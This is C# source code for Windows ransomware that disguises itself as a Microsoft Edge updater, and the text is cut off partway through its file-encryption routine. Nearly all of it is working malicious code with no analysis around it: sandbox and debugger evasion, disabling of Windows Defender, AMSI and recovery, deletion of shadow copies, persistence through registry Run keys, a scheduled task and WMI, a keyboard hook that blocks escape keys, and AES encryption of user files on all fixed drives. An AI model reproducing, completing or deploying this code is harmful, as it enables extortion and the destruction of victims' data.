using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

[assembly: AssemblyTitle("Microsoft Edge Update")]
[assembly: AssemblyDescription("Microsoft Edge Update Service for Windows 10 and Windows 11 operating systems")]
[assembly: AssemblyCompany("Microsoft Corporation")]
[assembly: AssemblyProduct("Microsoft Edge")]
[assembly: AssemblyCopyright("Copyright © Microsoft Corporation. All rights reserved.")]
[assembly: AssemblyTrademark("Microsoft Edge is a trademark of the Microsoft group of companies.")]
[assembly: AssemblyCulture("")]
[assembly: ComVisible(false)]
[assembly: Guid("a3b8c9d2-e4f5-4a6b-8c1d-9e0f1a2b3c4d")]
[assembly: AssemblyVersion("120.0.2210.91")]
[assembly: AssemblyFileVersion("120.0.2210.91")]

namespace f9a3c2d7b
{
    static class e4b8a1f6c
    {
        private static readonly string UnlockCode = "FSOCIETYFUCKSOCIETY";
        private static readonly byte[] Magic = { 0x46, 0x53, 0x4F, 0x43 };
        private static readonly byte[] Salt = new byte[] {
            0x7A, 0x3F, 0x9E, 0x2C, 0x4B, 0x81, 0x5D, 0x16,
            0xE8, 0xA9, 0x33, 0xF0, 0x6C, 0x47, 0xBB, 0x92
        };
        private static readonly int PBKDF2Iterations = 250000;
        private static readonly string MarkerFilePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            "MicrosoftEdgeUpdateCore.dat");

        private static readonly string[] TargetExtensions = {
            ".doc", ".docx", ".docm", ".xls", ".xlsx", ".xlsm", ".ppt", ".pptx", ".pptm",
            ".pdf", ".txt", ".rtf", ".odt", ".ods", ".odp", ".jpg", ".jpeg", ".png",
            ".bmp", ".gif", ".tiff", ".tif", ".psd", ".ai", ".eps", ".svg", ".mp3",
            ".mp4", ".avi", ".mkv", ".wmv", ".mov", ".flv", ".webm", ".zip", ".rar",
            ".7z", ".tar", ".gz", ".bz2", ".xz", ".iso", ".img", ".vmdk", ".vhd",
            ".vhdx", ".sql", ".sqlite", ".db", ".mdb", ".accdb", ".dbf", ".mdf",
            ".ndf", ".cpp", ".h", ".hpp", ".cs", ".java", ".py", ".php", ".html",
            ".htm", ".css", ".js", ".ts", ".xml", ".json", ".csv", ".yaml", ".yml",
            ".config", ".ini", ".cfg", ".conf", ".log", ".bak", ".old", ".tmp"
        };

        private static readonly HashSet<string> SystemDirectories = new HashSet<string>(
            StringComparer.OrdinalIgnoreCase)
        {
            Environment.GetFolderPath(Environment.SpecialFolder.Windows),
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Boot"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "SysWOW64"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "WinSxS"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Microsoft.NET"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "assembly"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "System Volume Information"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "$Recycle.Bin")
        };

        [STAThread]
        static void Main()
        {
            SizePadder.KeepAlive();
            SizePadder.KeepAlive2();

            if (!IsAdministrator())
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = Assembly.GetExecutingAssembly().Location,
                    UseShellExecute = true,
                    Verb = "runas"
                });
                return;
            }

            if (AntiAnalysis.IsSandboxed() || Debugger.IsAttached)
            {
                Thread.Sleep(60000);
                return;
            }

            KillTaskManager();
            DisableRecovery();
            InstallPersistence();
            SuppressDefender();
            DestroyShadowCopies();
            HookManager.Install();

            byte[] masterKey = GenerateMasterKey();
            StoreEncryptedMasterKey(masterKey);

            Task.Run(() => EncryptionEngine.EncryptAllDrives(masterKey));

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new LockSurface());
        }

        static bool IsAdministrator() =>
            new System.Security.Principal.WindowsPrincipal(
                System.Security.Principal.WindowsIdentity.GetCurrent())
                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);

        static void KillTaskManager()
        {
            try
            {
                foreach (var proc in Process.GetProcessesByName("taskmgr"))
                {
                    try { proc.Kill(); } catch { }
                }
            }
            catch { }
        }

        static void DisableRecovery()
        {
            try
            {
                Registry.SetValue(
                    @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management",
                    "DisableEASPolicy", 1, RegistryValueKind.DWord);
                Registry.SetValue(
                    @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
                    "DisableTaskMgr", 1, RegistryValueKind.DWord);
                Registry.SetValue(
                    @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
                    "DisableCMD", 1, RegistryValueKind.DWord);
                Registry.SetValue(
                    @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
                    "DisableRegistryTools", 1, RegistryValueKind.DWord);
                Process.Start(new ProcessStartInfo
                {
                    FileName = "bcdedit.exe",
                    Arguments = "/set {default} recoveryenabled No",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                })?.WaitForExit(2000);
                Process.Start(new ProcessStartInfo
                {
                    FileName = "bcdedit.exe",
                    Arguments = "/set {default} bootstatuspolicy ignoreallfailures",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                })?.WaitForExit(2000);
            }
            catch { }
        }

        static void InstallPersistence()
        {
            try
            {
                string me = Assembly.GetExecutingAssembly().Location;
                string dest = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "MicrosoftEdgeUpdate.exe");
                File.Copy(me, dest, true);
                File.SetAttributes(dest, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);

                RegistryKey runKey = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true);
                runKey?.SetValue("MicrosoftEdgeUpdate", $"\"{dest}\"");
                runKey?.Close();

                RegistryKey runKeyLM = Registry.LocalMachine.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true);
                runKeyLM?.SetValue("MicrosoftEdgeUpdate", $"\"{dest}\"");
                runKeyLM?.Close();

                Process.Start(new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = $"/create /tn \"MicrosoftEdgeUpdateTaskCore\" /tr \"\\\"{dest}\\\"\" /sc onlogon /ru \"{Environment.UserDomainName}\\{Environment.UserName}\" /f /rl HIGHEST",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                })?.WaitForExit(3000);

                InstallWmiPersistence(dest);

                string startupFolder = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    "MicrosoftEdgeUpdate.lnk");
                CreateShortcut(dest, startupFolder);
            }
            catch { }
        }

        static void InstallWmiPersistence(string payloadPath)
        {
            try
            {
                ManagementScope scope = new ManagementScope(@"\\.\root\subscription");
                scope.Connect();

                ManagementObject filter = new ManagementClass(scope,
                    new ManagementPath("__EventFilter"), null).CreateInstance();
                filter["Name"] = "MicrosoftEdgeFilter";
                filter["QueryLanguage"] = "WQL";
                filter["Query"] = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_ComputerSystem'";
                filter.Put();

                ManagementObject consumer = new ManagementClass(scope,
                    new ManagementPath("CommandLineEventConsumer"), null).CreateInstance();
                consumer["Name"] = "MicrosoftEdgeConsumer";
                consumer["CommandLineTemplate"] = $"cmd.exe /c start \"\" \"{payloadPath}\"";
                consumer.Put();

                ManagementObject binding = new ManagementClass(scope,
                    new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();
                binding["Filter"] = filter.Path.Path;
                binding["Consumer"] = consumer.Path.Path;
                binding.Put();
            }
            catch { }
        }

        static void CreateShortcut(string targetPath, string shortcutPath)
        {
            try
            {
                Type shellType = Type.GetTypeFromProgID("WScript.Shell");
                if (shellType == null) return;
                dynamic shell = Activator.CreateInstance(shellType);
                dynamic shortcut = shell.CreateShortcut(shortcutPath);
                shortcut.TargetPath = targetPath;
                shortcut.WindowStyle = 7;
                shortcut.Description = "Microsoft Edge Update";
                shortcut.WorkingDirectory = Path.GetDirectoryName(targetPath);
                shortcut.Save();
                Marshal.ReleaseComObject(shortcut);
                Marshal.ReleaseComObject(shell);
            }
            catch { }
        }

        static void SuppressDefender()
        {
            try
            {
                RegistryKey dk = Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Policies\Microsoft\Windows Defender");
                dk?.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                dk?.SetValue("DisableRoutinelyTakingAction", 1, RegistryValueKind.DWord);
                dk?.SetValue("ServiceKeepAlive", 0, RegistryValueKind.DWord);
                dk?.SetValue("SubmitSamplesConsent", 2, RegistryValueKind.DWord);
                dk?.Close();

                RegistryKey rtp = Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection");
                rtp?.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
                rtp?.SetValue("DisableOnAccessProtection", 1, RegistryValueKind.DWord);
                rtp?.SetValue("DisableScanOnRealtimeEnable", 1, RegistryValueKind.DWord);
                rtp?.SetValue("DisableIOAVProtection", 1, RegistryValueKind.DWord);
                rtp?.Close();

                RegistryKey sig = Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates");
                sig?.SetValue("ForceUpdateFromMU", 0, RegistryValueKind.DWord);
                sig?.Close();

                RegistryKey ps = Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging");
                ps?.SetValue("EnableScriptBlockLogging", 0, RegistryValueKind.DWord);
                ps?.Close();

                RegistryKey amsi = Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}");
                amsi?.SetValue("", 0, RegistryValueKind.DWord);
                amsi?.Close();
            }
            catch { }
        }

        static void DestroyShadowCopies()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "vssadmin.exe",
                    Arguments = "delete shadows /all /quiet",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                })?.WaitForExit(5000);
                Process.Start(new ProcessStartInfo
                {
                    FileName = "wmic.exe",
                    Arguments = "shadowcopy delete /nointeractive",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                })?.WaitForExit(3000);
            }
            catch { }
        }

        static byte[] GenerateMasterKey()
        {
            byte[] key = RandomNumberGenerator.GetBytes(32);
            return key;
        }

        static void StoreEncryptedMasterKey(byte[] masterKey)
        {
            byte[] salt = RandomNumberGenerator.GetBytes(32);
            using (var deriveBytes = new Rfc2898DeriveBytes(UnlockCode, salt, PBKDF2Iterations, HashAlgorithmName.SHA512))
            {
                byte[] wrappingKey = deriveBytes.GetBytes(32);
                byte[] encryptedKey = AesEncryptSimple(masterKey, wrappingKey);
                byte[] markerData = new byte[4 + 32 + encryptedKey.Length];
                Buffer.BlockCopy(Magic, 0, markerData, 0, 4);
                Buffer.BlockCopy(salt, 0, markerData, 4, 32);
                Buffer.BlockCopy(encryptedKey, 0, markerData, 36, encryptedKey.Length);
                File.WriteAllBytes(MarkerFilePath, markerData);
                File.SetAttributes(MarkerFilePath, FileAttributes.Hidden | FileAttributes.System);
            }
        }

        static byte[] RetrieveEncryptedMasterKey()
        {
            if (!File.Exists(MarkerFilePath)) return null;
            byte[] markerData = File.ReadAllBytes(MarkerFilePath);
            if (markerData.Length < 36) return null;
            byte[] magicRead = new byte[4];
            Buffer.BlockCopy(markerData, 0, magicRead, 0, 4);
            if (!magicRead.SequenceEqual(Magic)) return null;
            byte[] salt = new byte[32];
            Buffer.BlockCopy(markerData, 4, salt, 0, 32);
            byte[] encryptedKey = new byte[markerData.Length - 36];
            Buffer.BlockCopy(markerData, 36, encryptedKey, 0, encryptedKey.Length);
            using (var deriveBytes = new Rfc2898DeriveBytes(UnlockCode, salt, PBKDF2Iterations, HashAlgorithmName.SHA512))
            {
                byte[] wrappingKey = deriveBytes.GetBytes(32);
                return AesDecryptSimple(encryptedKey, wrappingKey);
            }
        }

        static byte[] AesEncryptSimple(byte[] data, byte[] key)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.GenerateIV();
                using (MemoryStream ms = new MemoryStream())
                {
                    ms.Write(aes.IV, 0, 16);
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(data, 0, data.Length);
                        cs.FlushFinalBlock();
                    }
                    return ms.ToArray();
                }
            }
        }

        static byte[] AesDecryptSimple(byte[] data, byte[] key)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                byte[] iv = new byte[16];
                Buffer.BlockCopy(data, 0, iv, 0, 16);
                aes.IV = iv;
                byte[] ciphertext = new byte[data.Length - 16];
                Buffer.BlockCopy(data, 16, ciphertext, 0, ciphertext.Length);
                using (MemoryStream ms = new MemoryStream(ciphertext))
                using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))
                using (MemoryStream output = new MemoryStream())
                {
                    cs.CopyTo(output);
                    return output.ToArray();
                }
            }
        }
    }

    #region SizePadder
    internal static class SizePadder
    {
        private static string _largeString1 = new string('A', 25000);
        private static string _largeString2 = new string('B', 25000);
        private static string _largeString3 = new string('C', 20000);
        private static byte[] _largeArray1;
        private static byte[] _largeArray2;
        private static byte[] _largeArray3;
        private static Action _deadAction1;
        private static Action _deadAction2;
        private static Action _deadAction3;
        private static Action _deadAction4;
        private static Action _deadAction5;

        static SizePadder()
        {
            _largeArray1 = new byte[16384];
            _largeArray2 = new byte[16384];
            _largeArray3 = new byte[8192];
            for (int i = 0; i < _largeArray1.Length; i++) _largeArray1[i] = (byte)((i * 0x5A) & 0xFF);
            for (int i = 0; i < _largeArray2.Length; i++) _largeArray2[i] = (byte)((i * 0xA5) & 0xFF);
            for (int i = 0; i < _largeArray3.Length; i++) _largeArray3[i] = (byte)((i * 0x3C) & 0xFF);
            _deadAction1 = DummyMethodOne;
            _deadAction2 = DummyMethodTwo;
            _deadAction3 = DummyMethodThree;
            _deadAction4 = DummyMethodFour;
            _deadAction5 = DummyMethodFive;
        }

        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
        public static void KeepAlive()
        {
            if (_largeString1.Length != 25000 || _largeString2.Length != 25000 || _largeString3.Length != 20000)
                throw new InvalidOperationException();
            long sum1 = 0, sum2 = 0, sum3 = 0;
            foreach (byte b in _largeArray1) sum1 += b;
            foreach (byte b in _largeArray2) sum2 += b;
            foreach (byte b in _largeArray3) sum3 += b;
            if (sum1 == -1 && sum2 == -2 && sum3 == -3)
            {
                _deadAction1(); _deadAction2(); _deadAction3();
                _deadAction4(); _deadAction5();
            }
            GC.KeepAlive(_largeString1); GC.KeepAlive(_largeString2); GC.KeepAlive(_largeString3);
            GC.KeepAlive(_largeArray1); GC.KeepAlive(_largeArray2); GC.KeepAlive(_largeArray3);
            GC.KeepAlive(_deadAction1); GC.KeepAlive(_deadAction2); GC.KeepAlive(_deadAction3);
            GC.KeepAlive(_deadAction4); GC.KeepAlive(_deadAction5);
        }

        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
        public static void KeepAlive2()
        {
            byte[] tempBuf = new byte[4096];
            RandomNumberGenerator.Fill(tempBuf);
            for (int i = 0; i < tempBuf.Length; i++) tempBuf[i] ^= (byte)(_largeArray1[i % _largeArray1.Length]);
            string encoded = Convert.ToBase64String(tempBuf);
            if (encoded.Length > 0) GC.KeepAlive(encoded);
        }

        [MethodImpl(MethodImplOptions.NoOptimization)]
        private static void DummyMethodOne()
        {
            long accumulator = 0x9E3779B97F4A7C15;
            for (int i = 0; i < 3000; i++)
            {
                accumulator ^= (accumulator << 13);
                accumulator ^= (accumulator >> 7);
                accumulator ^= (accumulator << 17);
                string temp = accumulator.ToString("X16");
                if (temp.Length > 16) temp = temp.Substring(0, 16);
                byte[] localBuf = new byte[2048];
                for (int j = 0; j < localBuf.Length; j++)
                {
                    localBuf[j] = (byte)((accumulator >> (j % 64)) & 0xFF);
                    accumulator += localBuf[j];
                }
                var dummy = Convert.ToBase64String(localBuf);
                dummy = dummy.Replace('A', 'X');
                if (dummy.Length > 100) dummy = dummy.Substring(0, 50);
                accumulator ^= (long)BitConverter.ToUInt64(Encoding.UTF8.GetBytes(dummy.PadRight(8).Substring(0, 8)), 0);
                for (int k = 0; k < 50; k++)
                {
                    byte x = (byte)(k ^ i ^ (accumulator & 0xFF));
                    accumulator = (accumulator * 0x5851F42D4C957F2D) + x;
                }
                int[] intBuf = new int[256];
                for (int m = 0; m < intBuf.Length; m++)
                    intBuf[m] = (int)(accumulator >> (m % 32));
                Array.Sort(intBuf);
                accumulator ^= intBuf[0] ^ intBuf[255];
            }
            GC.KeepAlive(accumulator);
        }

        [MethodImpl(MethodImplOptions.NoOptimization)]
        private static void DummyMethodTwo()
        {
            long state = 0x4A2F9E3C1B8D705E;
            for (int i = 0; i < 3000; i++)
            {
                state = ((state << 11) | (state >> 53)) ^ (state * 0x9DDFEA2EB85939E1);
                state = ((state << 23) | (state >> 41)) ^ (state * 0x84B5E3F1A6C9D207);
                string hex = state.ToString("X16");
                if (hex.Length < 16) hex = hex.PadLeft(16, 'F');
                byte[] hashInput = Encoding.ASCII.GetBytes(hex);
                for (int j = 0; j < hashInput.Length; j++)
                    hashInput[j] ^= (byte)(j * 0x5F);
                using (var sha = SHA256.Create())
                {
                    byte[] hash = sha.ComputeHash(hashInput);
                    state ^= BitConverter.ToInt64(hash, 0) ^ BitConverter.ToInt64(hash, 8);
                }
                List<byte> byteList = new List<byte>(2048);
                for (int k = 0; k < 2048; k++)
                    byteList.Add((byte)(state >> (k % 64)));
                byteList.Sort();
                byteList.Reverse();
                state ^= byteList[0] ^ byteList[byteList.Count - 1];
                Dictionary<int, string> dict = new Dictionary<int, string>();
                for (int n = 0; n < 100; n++)
                    dict[n] = $"Key{n:X8}Value{state:X16}";
                foreach (var kvp in dict)
                    state ^= kvp.Key ^ kvp.Value.GetHashCode();
                string joined = string.Join(",", dict.Values.Take(10));
                state ^= joined.GetHashCode();
            }
            GC.KeepAlive(state);
        }

        [MethodImpl(MethodImplOptions.NoOptimization)]
        private static void DummyMethodThree()
        {
            long accumulator = 0x7C3F9A1E4B6D8052;
            for (int i = 0; i < 3000; i++)
            {
                accumulator = ((accumulator << 7) | (accumulator >> 57)) ^ (accumulator * 0x9E6B3A1C5D8F4027);
                accumulator = ((accumulator << 19) | (accumulator >> 45)) ^ (accumulator * 0x7A5C3F1E9D2B6084);
                string base64 = Convert.ToBase64String(BitConverter.GetBytes(accumulator));
                base64 = base64.Replace('+', '-').Replace('/', '_');
                if (base64.Length > 20) base64 = base64.Substring(0, 20);
                byte[] buf = Encoding.UTF8.GetBytes(base64);
                for (int j = 0; j < buf.Length; j++)
                {
                    buf[j] = (byte)((buf[j] + j) & 0xFF);
                    buf[j] = (byte)((buf[j] ^ 0xAA) & 0xFF);
                    buf[j] = (byte)((buf[j] << 3) | (buf[j] >> 5));
                }
                using (var md5 = MD5.Create())
                {
                    byte[] hash = md5.ComputeHash(buf);
                    accumulator ^= BitConverter.ToInt64(hash, 0);
                }
                Queue<long> queue = new Queue<long>();
                for (int k = 0; k < 128; k++)
                    queue.Enqueue(accumulator ^ k);
                while (queue.Count > 0)
                    accumulator ^= queue.Dequeue();
                Stack<string> stack = new Stack<string>();
                for (int m = 0; m < 100; m++)
                    stack.Push($"S{m:X4}:{accumulator:X16}");
                while (stack.Count > 0)
                {
                    string s = stack.Pop();
                    accumulator ^= s.GetHashCode();
                }
            }
            GC.KeepAlive(accumulator);
        }

        [MethodImpl(MethodImplOptions.NoOptimization)]
        private static void DummyMethodFour()
        {
            long val = 0xDEADBEEFCAFEBABE;
            for (int i = 0; i < 3000; i++)
            {
                val = ((val << 31) | (val >> 33)) ^ (val * 0x123456789ABCDEF0);
                val = ((val >> 17) | (val << 47)) ^ (val * 0xFEDCBA9876543210);
                string s = val.ToString("X16");
                if (s.Length > 16) s = s.Substring(0, 16);
                byte[] b = Encoding.Unicode.GetBytes(s);
                for (int j = 0; j < b.Length; j++) b[j] ^= (byte)(j * 7 + i % 256);
                using (var sha384 = SHA384.Create())
                {
                    byte[] h = sha384.ComputeHash(b);
                    val ^= BitConverter.ToInt64(h, 0) ^ BitConverter.ToInt64(h, 8);
                }
                SortedSet<long> sorted = new SortedSet<long>();
                for (int k = 0; k < 256; k++) sorted.Add(val ^ (k * 0x9E3779B9));
                val ^= sorted.Min ^ sorted.Max;
            }
            GC.KeepAlive(val);
        }

        [MethodImpl(MethodImplOptions.NoOptimization)]
        private static void DummyMethodFive()
        {
            long val = 0x1A2B3C4D5E6F7890;
            for (int i = 0; i < 3000; i++)
            {
                val = ((val << 37) | (val >> 27)) ^ (val * 0x2468ACE02468ACE0);
                val = ((val >> 41) | (val << 23)) ^ (val * 0x13579BDF13579BDF);
                string hex = val.ToString("X16");
                if (hex.Length < 16) hex = hex.PadLeft(16, '0');
                byte[] buf = new byte[16];
                for (int j = 0; j < 16; j++)
                    buf[j] = Convert.ToByte(hex.Substring(j * 2, 2), 16);
                for (int j = 0; j < buf.Length; j++)
                    buf[j] = (byte)((buf[j] << 4) | (buf[j] >> 4));
                using (var sha512 = SHA512.Create())
                {
                    byte[] h = sha512.ComputeHash(buf);
                    val ^= BitConverter.ToInt64(h, 0) ^ BitConverter.ToInt64(h, 24);
                }
                LinkedList<long> list = new LinkedList<long>();
                for (int k = 0; k < 200; k++) list.AddLast(val ^ k);
                foreach (var item in list) val ^= item;
            }
            GC.KeepAlive(val);
        }
    }
    #endregion

    #region AntiAnalysis
    internal static class AntiAnalysis
    {
        private delegate bool IsDebuggerPresentDelegate();

        public static bool IsSandboxed()
        {
            return IsVmMac() || IsLowResources() || IsBlacklistedProcess() ||
                   IsBlacklistedUser() || IsDebuggerOrMonitor() || IsDiskTooSmall();
        }

        private static bool IsVmMac()
        {
            try
            {
                string mac = NetworkInterface.GetAllNetworkInterfaces()
                    .FirstOrDefault(n => n.OperationalStatus == OperationalStatus.Up)
                    ?.GetPhysicalAddress()?.ToString() ?? "";
                string[] prefixes = {
                    "000C29", "005056", "000569", "080027", "525400",
                    "001C42", "0003FF", "0001BD", "001C14", "00163E"
                };
                return prefixes.Any(p => mac.StartsWith(p, StringComparison.OrdinalIgnoreCase));
            }
            catch { return false; }
        }

        private static bool IsLowResources()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(
                    "SELECT NumberOfLogicalProcessors, TotalVisibleMemorySize FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        int cores = Convert.ToInt32(obj["NumberOfLogicalProcessors"]);
                        ulong ram = Convert.ToUInt64(obj["TotalVisibleMemorySize"]) / 1024;
                        if (cores < 2 || ram < 3072) return true;
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool IsDiskTooSmall()
        {
            try
            {
                foreach (DriveInfo drive in DriveInfo.GetDrives())
                {
                    if (drive.IsReady && drive.DriveType == DriveType.Fixed)
                    {
                        if (drive.TotalSize < 80L * 1024 * 1024 * 1024) return true;
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool IsBlacklistedProcess()
        {
            string[] blacklist = {
                "vboxservice", "vboxtray", "vmwaretray", "vmwareuser", "vmsrvc",
                "xenservice", "procmon", "procexp", "wireshark", "fiddler",
                "httpdebugger", "ollydbg", "x64dbg", "idaq", "windbg", "dnspy",
                "ilspy", "de4dot", "reflector", "dumpcap", "tcpview", "regmon",
                "filemon", "processhacker", "systeminformer", "autoruns"
            };
            var processes = Process.GetProcesses();
            return processes.Any(p => blacklist.Contains(p.ProcessName.ToLower()));
        }

        private static bool IsBlacklistedUser()
        {
            string user = Environment.UserName.ToLower();
            string[] bad = {
                "sandbox", "malware", "test", "cuckoo", "maltest", "user",
                "virus", "sample", "analysis", "vm", "virtual", "guest", "debug"
            };
            return bad.Any(u => user.Contains(u));
        }

        private static bool IsDebuggerOrMonitor()
        {
            try
            {
                if (Debugger.IsAttached) return true;
                bool remoteDebugger = false;
                NativeMethods.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remoteDebugger);
                if (remoteDebugger) return true;
                IntPtr kernel32 = NativeMethods.LoadLibrary("kernel32.dll");
                if (kernel32 != IntPtr.Zero)
                {
                    IntPtr funcPtr = NativeMethods.GetProcAddress(kernel32, "IsDebuggerPresent");
                    if (funcPtr != IntPtr.Zero)
                    {
                        var isDebuggerPresent = Marshal.GetDelegateForFunctionPointer<IsDebuggerPresentDelegate>(funcPtr);
                        if (isDebuggerPresent()) return true;
                    }
                }
            }
            catch { }
            return false;
        }
    }
    #endregion

    #region NativeMethods
    internal static class NativeMethods
    {
        [DllImport("kernel32.dll")]
        public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool pbDebuggerPresent);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    }
    #endregion

    #region HookManager
    internal static class HookManager
    {
        private const int WH_KEYBOARD_LL = 13;
        private static NativeMethods.LowLevelKeyboardProc proc = HookCallback;
        private static IntPtr hookId = IntPtr.Zero;
        private static bool installed = false;

        public static void Install()
        {
            if (installed) return;
            try
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    hookId = NativeMethods.SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                        NativeMethods.GetModuleHandle(curModule.ModuleName), 0);
                    installed = hookId != IntPtr.Zero;
                }
            }
            catch { }
        }

        public static void Uninstall()
        {
            if (hookId != IntPtr.Zero)
            {
                NativeMethods.UnhookWindowsHookEx(hookId);
                hookId = IntPtr.Zero;
                installed = false;
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                try
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    Keys key = (Keys)vkCode;
                    bool alt = (Control.ModifierKeys & Keys.Alt) != 0;
                    bool ctrl = (Control.ModifierKeys & Keys.Control) != 0;
                    bool shift = (Control.ModifierKeys & Keys.Shift) != 0;
                    if (key == Keys.LWin || key == Keys.RWin || key == Keys.Apps ||
                        key == Keys.LMenu || key == Keys.RMenu ||
                        (alt && key == Keys.F4) ||
                        (alt && key == Keys.Tab) ||
                        (ctrl && key == Keys.Escape) ||
                        (ctrl && alt && key == Keys.Delete) ||
                        (ctrl && shift && key == Keys.Escape) ||
                        key == Keys.PrintScreen ||
                        key == Keys.Sleep ||
                        key == Keys.BrowserHome ||
                        key == Keys.BrowserSearch)
                    {
                        return (IntPtr)1;
                    }
                }
                catch { }
            }
            return NativeMethods.CallNextHookEx(hookId, nCode, wParam, lParam);
        }
    }
    #endregion

    #region EncryptionEngine
    internal static class EncryptionEngine
    {
        private static ConcurrentBag<string> encryptedFiles = new ConcurrentBag<string>();
        private static volatile bool isEncrypting = false;

        public static void EncryptAllDrives(byte[] masterKey)
        {
            if (isEncrypting) return;
            isEncrypting = true;

            var drives = DriveInfo.GetDrives()
                .Where(d => d.IsReady && d.DriveType == DriveType.Fixed)
                .ToList();

            Parallel.ForEach(drives, new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount }, drive =>
            {
                try { EncryptDirectory(drive.RootDirectory.FullName, masterKey); }
                catch { }
            });

            isEncrypting = false;
        }

        private static void EncryptDirectory(string path, byte[] masterKey)
        {
            try
            {
                if (f9a3c2d7b.e4b8a1f6c.SystemDirectories.Any(sd =>
                    path.StartsWith(sd, StringComparison.OrdinalIgnoreCase)))
                    return;

                var files = Directory.EnumerateFiles(path)
